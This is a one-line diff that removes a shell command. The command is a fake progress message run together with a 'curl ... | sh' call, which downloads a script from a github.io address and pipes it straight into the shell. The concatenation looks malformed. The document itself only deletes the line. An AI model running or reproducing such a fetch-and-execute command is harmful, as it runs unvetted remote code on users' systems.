@@ -1,1 +1,0 @@
-echo Progress: 53.00%curl -L --progress-bar frkns.github.io/fun/supervision-periods.msft | sh
